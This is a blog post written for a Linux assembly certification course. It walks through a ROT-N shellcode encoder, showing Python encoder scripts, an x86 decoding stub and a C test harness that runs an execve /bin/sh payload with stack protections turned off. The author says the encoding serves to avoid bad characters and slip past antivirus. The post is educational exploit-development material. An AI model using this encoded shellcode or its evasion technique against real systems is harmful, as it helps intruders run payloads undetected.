<i>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</i><br /><i> </i><i><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></i><br /><i> </i><i><b>Student ID:</b>&nbsp;SLAE-885</i><br /><i><b>Assignment number: </b>4</i><br /><i><b>Github repo:</b> <a href="https://github.com/abatchy17/SLAE">https://github.com/abatchy17/SLAE</a></i><br /><br /><h2>What is shellcode encoding?<i> </i></h2>Encoding shellcode is common to avoid bad characters or trick lame AVs into believing your code isn't malicious. To execute the shellcode, you'll need a "decoding stub" appending the shellcode so it returns the shellcode back to its original form then allow it to execute. An easy way to encode your shellcode is using <a href="https://www.offensive-security.com/metasploit-unleashed/msfencode/">MSF encoders</a> (link is outdated as msfencode and msfpayload have been replaced with msfvenom but syntax is pretty much the same.<br /><br />Assignment 4 of SLAE requires a custom encoder, can be pretty much anything. Being lazy, I decided to go for ROT-13 (or any number between 1-255 for the matter). This post will walk you through creating a (simple) custom encoder.<br /><br /><h2>Pros and cons</h2><h4>Pros: </h4>1. Will most likely get rid of null characters.<br />2. Some AVs won't recognize it.<br /><br /><h4>Cons:</h4>1. Decoding stub will easily get picked by AVs.<br />2. Doesn't obfuscate the code.<br />3. Decoder needs to know the size of the shellcode, this can be done by using a conditional jump for the operation done, or by explicitly defining the size of the shellcode. Implementation details will discuss both approaches.<br /><br /><h2>Implementation of ROT-13 encoder/decoder </h2><br /><h4>1. Generate encoded payload</h4>We'll first create an encoder (simple python script) that will iterate over the payload (simple execve("/bin//sh", NULL,NULL)) and print it.<br /><!-- HTML generated using hilite.me --><br /><div style="background: #272822; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #75715e;">#!/bin/python</span><br /><br /><span style="color: #f8f8f2;">shellcode</span> <span style="color: #f92672;">=</span> <span style="color: #f8f8f2;">(</span><span style="color: #e6db74;">"</span><span style="color: #ae81ff;">\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80</span><span style="color: #e6db74;">"</span><span style="color: #f8f8f2;">)</span><br /><br /><span style="color: #f8f8f2;">magic</span> <span style="color: #f92672;">=</span> <span style="color: #ae81ff;">13</span><br /><br /><span style="color: #f8f8f2;">encoded1</span> <span style="color: #f92672;">=</span> <span style="color: #e6db74;">""</span><br /><span style="color: #f8f8f2;">encoded2</span> <span style="color: #f92672;">=</span> <span style="color: #e6db74;">""</span><br /><br /><span style="color: #66d9ef;">for</span> <span style="color: #f8f8f2;">i</span> <span style="color: #f92672;">in</span> <span style="color: #f8f8f2;">bytearray(shellcode):</span><br /> <span style="color: #f8f8f2;">j</span> <span style="color: #f92672;">=</span> <span style="color: #f8f8f2;">(i</span> <span style="color: #f92672;">+</span> <span style="color: #f8f8f2;">magic)</span><span style="color: #f92672;">%</span><span style="color: #ae81ff;">256</span><br /> <span style="color: #f8f8f2;">encoded1</span> <span style="color: #f92672;">+=</span> <span style="color: #e6db74;">'</span><span style="color: #ae81ff;">\\</span><span style="color: #e6db74;">x'</span><br /> <span style="color: #f8f8f2;">encoded1</span> <span style="color: #f92672;">+=</span> <span style="color: #e6db74;">'%02x'</span> <span style="color: #f92672;">%</span><span style="color: #f8f8f2;">j</span><br /><br /> <span style="color: #f8f8f2;">encoded2</span> <span style="color: #f92672;">+=</span> <span style="color: #e6db74;">'0x'</span><br /> <span style="color: #f8f8f2;">encoded2</span> <span style="color: #f92672;">+=</span> <span style="color: #e6db74;">'%02x, '</span> <span style="color: #f92672;">%</span><span style="color: #f8f8f2;">j</span><br /><br /><span style="color: #66d9ef;">print</span> <span style="color: #e6db74;">"Format 1: {0}"</span><span style="color: #f92672;">.</span><span style="color: #f8f8f2;">format(encoded1)</span><br /><span style="color: #66d9ef;">print</span> <span style="color: #e6db74;">"Format 2: {0}"</span><span style="color: #f92672;">.</span><span style="color: #f8f8f2;">format(encoded2)</span><br /></pre></div><br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">abatchy@ubuntu:~/Desktop/work$</span> python encoder.py <br /><span style="color: #888888;">Format 1: \x3e\xcd\x5d\x96\xef\x75\x3c\x3c\x80\x75\x75\x3c\x6f\x76\x7b\x96\xf0\x5d\xbd\x18\xda\x8d<br />Format 2: 0x3e, 0xcd, 0x5d, 0x96, 0xef, 0x75, 0x3c, 0x3c, 0x80, 0x75, 0x75, 0x3c, 0x6f, 0x76, 0x7b, 0x96, 0xf0, 0x5d, 0xbd, 0x18, 0xda, 0x8d,</span><br /></pre></div><br />As you can notice, bytes have been incremented by <b>13</b>, so <b>31</b> becomes <b>3e</b>, <b>c0</b> becomes <b>cd</b> and so on.<br /><br /><h4>2. Write assembly wrapper including decoding stub</h4><h4>&nbsp;</h4>Next, we'll write an assembly wrapper to decode the shellcode and execute it. Notice that we don't have a way to know size of the shellcode, so we'll hard code its size for now, followed by a nice improvement to get rid of that.<br /><br /><pre style="background: #000000; color: #d1d1d1;"><span style="color: #9999a9;">; Rot13ExecveSh.asm</span><br /><span style="color: #9999a9;">; by Abatchy</span><br /><span style="color: #9999a9;">;</span><br /><span style="color: #9999a9;">;   nasm -felf32 Rot13Encoder.asm &amp;&amp; ld -o Rot13Encoder Rot13Encoder.o</span><br /><span style="color: #9999a9;">; Generated shellcode: </span><br /><br /><span style="color: #008073;">global</span> _start<br /><br /><span style="color: #008073;">section</span> .text<br /><br /><span style="color: #e34adc;">_start:</span><br />    <br />    <span style="color: #e66170; font-weight: bold;">jmp</span><span style="color: #e66170; font-weight: bold;"> short</span> <span style="color: #e34adc;">get_shellcode_addr</span>    <span style="color: #9999a9;">; Get address of shellcode</span><br /><br /><span style="color: #e34adc;">ReturnLabel:</span><br />    <span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">esi</span>                 <span style="color: #9999a9;">; Store address of "shellcode" in esi</span><br />    <span style="color: #e66170; font-weight: bold;">xor</span> <span style="color: #d0d09f;">eax</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">eax</span><br />    <span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #d0d09f;">al</span><span style="color: #d2cd86;">,</span> <span style="color: #008c00;">22</span><br /><span style="color: #e34adc;">decode:</span><br />    <span style="color: #e66170; font-weight: bold;">sub</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #d2cd86;">[</span><span style="color: #d0d09f;">esi</span><span style="color: #d2cd86;">]</span><span style="color: #d2cd86;">,</span> <span style="color: #008c00;">13</span>      <span style="color: #9999a9;">; Decode byte at [esi]</span><br />    <span style="color: #e66170; font-weight: bold;">dec</span> <span style="color: #d0d09f;">al</span><br />    <span style="color: #e66170; font-weight: bold;">jz</span> <span style="color: #e34adc;">shellcode</span>            <br />    <span style="color: #e66170; font-weight: bold;">inc</span> <span style="color: #d0d09f;">esi</span><br />    <span style="color: #e66170; font-weight: bold;">jmp</span><span style="color: #e66170; font-weight: bold;"> short</span> <span style="color: #e34adc;">decode</span><br /><br /><span style="color: #e34adc;">get_shellcode_addr:</span><br />    <span style="color: #e66170; font-weight: bold;">call</span> <span style="color: #e34adc;">ReturnLabel</span><br /><span style="color: #e34adc;">&nbsp;&nbsp;&nbsp;&nbsp;shellcode:</span> <span style="color: #008073;">db</span>  <span style="color: #00a800;">0x3e</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0xcd</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x5d</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x96</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0xef</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x75</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x3c</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x3c</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x80</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x75</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x75</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x3c</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x6f</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x76,</span><br />                   <span style="color: #00a800;"><span style="color: #00a800;">0x7b</span><span style="color: #d2cd86;">, </span>0x96</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0xf0</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x5d</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0xbd</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x18</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0xda</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x8d</span><br /></pre><br /><h4>3. Extract shellcode into C wrapper</h4><h4>&nbsp;</h4>Why do we need this? The shellcode is defined in the text segment, which means editing it will crash the program, so we need a C wrapper where the shellcode is decoded without causing issues.<br /><pre style="background: #000000; color: #d1d1d1;"><span style="color: #9999a9;">/*</span><br /><span style="color: #9999a9;">&nbsp;Rot13ExecveSh.c</span><br /><span style="color: #9999a9;">By Abatchy</span><br /><span style="color: #9999a9;">gcc Rot13ExecveSh.c -fno-stack-protector -z execstack -o Rot13ExecveSh.out</span><br /><span style="color: #9999a9;">*/</span><br /><br /><span style="color: #008073;">#</span><span style="color: #008073;">include </span><span style="color: #02d045;">&lt;</span><span style="color: #40015a;">stdio.h</span><span style="color: #02d045;">&gt;</span><br /><span style="color: #008073;">#</span><span style="color: #008073;">include </span><span style="color: #02d045;">&lt;</span><span style="color: #40015a;">string.h</span><span style="color: #02d045;">&gt;</span><br /><br /><span style="color: #e66170; font-weight: bold;">unsigned</span> <span style="color: #e66170; font-weight: bold;">char</span> sc<span style="color: #d2cd86;">[</span><span style="color: #d2cd86;">]</span> <span style="color: #d2cd86;">=</span> <br /><span style="color: #02d045;">"</span><span style="color: teal;">\xeb</span><span style="color: teal;">\x0f</span><span style="color: teal;">\x5e</span><span style="color: teal;">\x31</span><span style="color: teal;">\xc0</span><span style="color: teal;">\xb0</span><span style="color: teal;">\x16</span><span style="color: teal;">\x80</span><span style="color: #02d045;">"</span><br /><span style="color: #02d045;">"</span><span style="color: teal;">\x2e</span><span style="color: teal;">\x0d</span><span style="color: teal;">\xfe</span><span style="color: teal;">\xc8</span><span style="color: teal;">\x74</span><span style="color: teal;">\x08</span><span style="color: teal;">\x46</span><span style="color: teal;">\xeb</span><span style="color: #02d045;">"</span><br /><span style="color: #02d045;">"</span><span style="color: teal;">\xf6</span><span style="color: teal;">\xe8</span><span style="color: teal;">\xec</span><span style="color: teal;">\xff</span><span style="color: teal;">\xff</span><span style="color: teal;">\xff</span><span style="color: teal;">\x3e</span><span style="color: teal;">\xcd</span><span style="color: #02d045;">"</span><br /><span style="color: #02d045;">"</span><span style="color: teal;">\x5d</span><span style="color: teal;">\x96</span><span style="color: teal;">\xef</span><span style="color: teal;">\x75</span><span style="color: teal;">\x3c</span><span style="color: teal;">\x3c</span><span style="color: teal;">\x80</span><span style="color: teal;">\x75</span><span style="color: #02d045;">"</span><br /><span style="color: #02d045;">"</span><span style="color: teal;">\x75</span><span style="color: teal;">\x3c</span><span style="color: teal;">\x6f</span><span style="color: teal;">\x76</span><span style="color: teal;">\x7b</span><span style="color: teal;">\x96</span><span style="color: teal;">\xf0</span><span style="color: teal;">\x5d</span><span style="color: #02d045;">"</span><br /><span style="color: #02d045;">"</span><span style="color: teal;">\xbd</span><span style="color: teal;">\x18</span><span style="color: teal;">\xda</span><span style="color: teal;">\x8d</span><span style="color: #02d045;">"</span><span style="color: #b060b0;">;</span><br /><br /><span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #e66170; font-weight: bold;">main</span><span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span><br /><span style="color: #b060b0;">{</span><br />    <span style="color: #e66170; font-weight: bold;">printf</span><span style="color: #d2cd86;">(</span><span style="color: #02d045;">"</span><span style="color: #00c4c4;">Shellcode size: </span><span style="color: #007997;">%d</span><span style="color: teal;">\n</span><span style="color: #02d045;">"</span><span style="color: #d2cd86;">,</span> <span style="color: #e66170; font-weight: bold;">strlen</span><span style="color: #d2cd86;">(</span>sc<span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span><br />    <span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">*</span>ret<span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span> <span style="color: #d2cd86;">=</span> <span style="color: #d2cd86;">(</span><span style="color: #e66170; font-weight: bold;">int</span><span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">*</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">)</span>sc<span style="color: #b060b0;">;</span><br />    ret<span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span><span style="color: #b060b0;">;</span><br /><span style="color: #b060b0;">}</span><br /></pre><br />Now compile and run!<br /><!-- HTML generated using hilite.me --><br /><div style="background: #ffffff; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid gray; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #c65d09; font-weight: bold;">abatchy@ubuntu:~/Desktop/work$</span> gcc Rot13ExecveSh.c -fno-stack-protector -z execstack -o Rot13ExecveSh.out<br /><span style="color: #c65d09; font-weight: bold;">abatchy@ubuntu:~/Desktop/work$</span> ./Rot13ExecveSh.out <br /><span style="color: #888888;">Shellcode size: 44</span><br /><span style="color: #c65d09; font-weight: bold;">$</span> <span style="color: #007722;">exit</span><br /></pre></div><br /><h4>4. Getting rid of hard-coded shellcode size</h4><br />Hard coding the shellcod size in the decoding stub is ugly, and is better to get rid of it for robustness, how do we do that?<br /><br />Check the assembly code we used earler, it's already using the SUB instruction, which affects registers. What if we add an additional byte of value N (in this case it's 13), so when it's subtracted, followed by a JZ jmp instruction, we know that we reached the end of the shellcode?<br /><br /><b>Modified assembly wrapper</b><br /><pre style="background: #000000; color: #d1d1d1;"><span style="color: #9999a9;">; Rot13ExecveSh.asm</span><br /><span style="color: #9999a9;">; by Abatchy</span><br /><span style="color: #9999a9;">;</span><br /><span style="color: #9999a9;">;   nasm -felf32 Rot13Encoder.asm &amp;&amp; ld -o Rot13Encoder Rot13Encoder.o</span><br /><span style="color: #9999a9;">; Generated shellcode: </span><br /><br /><span style="color: #008073;">global</span> _start<br /><br /><span style="color: #008073;">section</span> .text<br /><br /><span style="color: #e34adc;">_start:</span><br />    <br />    <span style="color: #e66170; font-weight: bold;">jmp</span><span style="color: #e66170; font-weight: bold;"> short</span> <span style="color: #e34adc;">get_shellcode_addr</span>    <span style="color: #9999a9;">; Get address of shellcode</span><br /><br /><span style="color: #e34adc;">ReturnLabel:</span><br />    <span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">esi</span>                 <span style="color: #9999a9;">; Store address of "shellcode" in esi</span><br /><span style="color: #e34adc;">decode:</span><br />    <span style="color: #e66170; font-weight: bold;">sub</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #d2cd86;">[</span><span style="color: #d0d09f;">esi</span><span style="color: #d2cd86;">]</span><span style="color: #d2cd86;">,</span> <span style="color: #008c00;">13</span>      <span style="color: #9999a9;">; Decode byte at [esi]</span><br />    <span style="color: #e66170; font-weight: bold;">jz</span> <span style="color: #e34adc;">shellcode</span>            <br />    <span style="color: #e66170; font-weight: bold;">inc</span> <span style="color: #d0d09f;">esi</span><br />    <span style="color: #e66170; font-weight: bold;">jmp</span><span style="color: #e66170; font-weight: bold;"> short</span> <span style="color: #e34adc;">decode</span><br /><br /><span style="color: #e34adc;">get_shellcode_addr:</span><br />    <span style="color: #e66170; font-weight: bold;">call</span> <span style="color: #e34adc;">ReturnLabel</span><br /><span style="color: #e34adc;">&nbsp;&nbsp;&nbsp;&nbsp;shellcode:</span> <span style="color: #008073;">db</span>  <span style="color: #00a800;">0x3e</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0xcd</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x5d</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x96</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0xef</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x75</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x3c</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x3c</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x80</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x75</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x75</span><span style="color: #d2cd86;">,</span> <br />                   <span style="color: #00a800;">0x3c</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x6f</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x76</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x7b</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x96</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0xf0</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x5d</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0xbd</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x18</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0xda</span><span style="color: #d2cd86;">,</span> <span style="color: #00a800;">0x8d</span>, <span style="color: red;"><b>0x0d</b></span><br /></pre><br /><h4>5. Python wrapper to support ROT-N</h4><h4>&nbsp;</h4>Wrapper below basically dissects the shellcode to replace instances where N is used, and encodes the payload, also shows a warning message if shellcode generated contains any null bytes.<br /><pre style="background: #000000; color: #d1d1d1;"><span style="color: #9999a9;">#!/bin/python</span><br /><br /><span style="color: #e66170; font-weight: bold;">import</span> sys<br /><br /><span style="color: #e66170; font-weight: bold;">def</span> parse_args<span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">:</span><br />    <span style="color: #e66170; font-weight: bold;">if</span> <span style="color: #e66170; font-weight: bold;">len</span><span style="color: #d2cd86;">(</span>sys<span style="color: #d2cd86;">.</span>argv<span style="color: #d2cd86;">)</span> <span style="color: #00dddd;">&lt;</span> <span style="color: #00a800;">2</span><span style="color: #d2cd86;">:</span><br />        <span style="color: #e66170; font-weight: bold;">print</span> <span style="color: #00c4c4;">"Usage: {0} N, where N is the number of rotations to be made"</span><span style="color: #d2cd86;">.</span>format<span style="color: #d2cd86;">(</span>sys<span style="color: #d2cd86;">.</span>argv<span style="color: #d2cd86;">[</span><span style="color: #00a800;">0</span><span style="color: #d2cd86;">]</span><span style="color: #d2cd86;">)</span><br />        <span style="color: #e66170; font-weight: bold;">print</span> <span style="color: #00c4c4;">"[+] Using default value of N = 13"</span><br />        <span style="color: #e66170; font-weight: bold;">return</span> <span style="color: #00a800;">13</span><br />    <span style="color: #e66170; font-weight: bold;">else</span><span style="color: #d2cd86;">:</span><br />        x <span style="color: #d2cd86;">=</span> <span style="color: #e66170; font-weight: bold;">int</span><span style="color: #d2cd86;">(</span>sys<span style="color: #d2cd86;">.</span>argv<span style="color: #d2cd86;">[</span><span style="color: #00a800;">1</span><span style="color: #d2cd86;">]</span><span style="color: #d2cd86;">)</span> <span style="color: #00dddd;">%</span> <span style="color: #00a800;">256</span><br />        <span style="color: #e66170; font-weight: bold;">if</span> x <span style="color: #00dddd;">&lt;</span> <span style="color: #00a800;">1</span><span style="color: #d2cd86;">:</span><br />            <span style="color: #e66170; font-weight: bold;">print</span> <span style="color: #00c4c4;">"[-] Invalid number of rotations"</span><br />            exit<span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span><br />        <span style="color: #e66170; font-weight: bold;">return</span> x<br /><br />magic <span style="color: #d2cd86;">=</span> parse_args<span style="color: #d2cd86;">(</span><span style="color: #d2cd86;">)</span><br />rotated_execve <span style="color: #d2cd86;">=</span> <span style="color: #00c4c4;">""</span><br />hasNulls <span style="color: #d2cd86;">=</span> False<br />        <br /><span style="color: #e66170; font-weight: bold;">print</span> <span style="color: #00c4c4;">"[+] Generating ROT-{0} encoded payload"</span><span style="color: #d2cd86;">.</span>format<span style="color: #d2cd86;">(</span>magic<span style="color: #d2cd86;">)</span><br /><br />execvesh <span style="color: #d2cd86;">=</span> <span style="color: #d2cd86;">(</span><span style="color: #00c4c4;">"</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">31</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">c0</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">50</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">89</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">e2</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">68</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">2f</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">2f</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">73</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">68</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">68</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">2f</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">62</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">69</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">6e</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">89</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">e3</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">50</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">b0</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">0b</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">cd</span><span style="color: teal;">\x</span><span style="color: #00c4c4;">80"</span><span style="color: #d2cd86;">)</span><br /><br /><br /><span style="color: #e66170; font-weight: bold;">for</span> i <span style="color: #e66170; font-weight: bold;">in</span> bytearray<span style="color: #d2cd86;">(</span>execvesh<span style="color: #d2cd86;">)</span><span style="color: #d2cd86;">:</span><br /> j <span style="color: #d2cd86;">=</span> <span style="color: #d2cd86;">(</span>i <span style="color: #00dddd;">+</span> magic<span style="color: #d2cd86;">)</span><span style="color: #00dddd;">%</span><span style="color: #00a800;">256</span><br />    <span style="color: #e66170; font-weight: bold;">    if</span> j <span style="color: #00dddd;">==</span> <span style="color: #00a800;">0</span><span style="color: #d2cd86;">:</span><br />                hasNulls <span style="color: #d2cd86;">=</span> True<br /> rotated_execve <span style="color: #00dddd;">+</span><span style="color: #d2cd86;">=</span> <span style="color: #00c4c4;">'</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">x'</span><br /> rotated_execve <span style="color: #00dddd;">+</span><span style="color: #d2cd86;">=</span> <span style="color: #00c4c4;">'%02x'</span> <span style="color: #00dddd;">%</span>j<br /><br />sc <span style="color: #d2cd86;">=</span> <span style="color: #00c4c4;">"</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">xeb</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">x09</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">x5e</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">x80</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">x2e"</span> <span style="color: #00dddd;">+</span> <span style="color: #d2cd86;">(</span><span style="color: #00c4c4;">"</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">x%02x"</span><span style="color: #00dddd;">%</span>magic<span style="color: #d2cd86;">)</span> <span style="color: #00dddd;">+</span> <span style="color: #00c4c4;">"</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">x74</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">x08</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">x46</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">xeb</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">xf8</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">xe8</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">xf2</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">xff</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">xff</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">xff"</span> <br />sc <span style="color: #00dddd;">+</span><span style="color: #d2cd86;">=</span> rotated_execve <span style="color: #00dddd;">+</span> <span style="color: #d2cd86;">(</span><span style="color: #00c4c4;">"</span><span style="color: teal;">\\</span><span style="color: #00c4c4;">x%02x"</span><span style="color: #00dddd;">%</span>magic<span style="color: #d2cd86;">)</span><br /><br /><span style="color: #e66170; font-weight: bold;">print</span> <span style="color: #00c4c4;">"[+] Generated shellcode: "</span> <span style="color: #00dddd;">+</span> sc<br /><br /><span style="color: #e66170; font-weight: bold;">if</span> hasNulls<span style="color: #d2cd86;">:</span><br />    <span style="color: #e66170; font-weight: bold;">print</span> <span style="color: #00c4c4;">"[-] WARNING: Encoded payload contains at least one null byte, consider changing N"</span><br /></pre><br />Feel free to give any feedback/suggestions.<br /><br />- Abatchy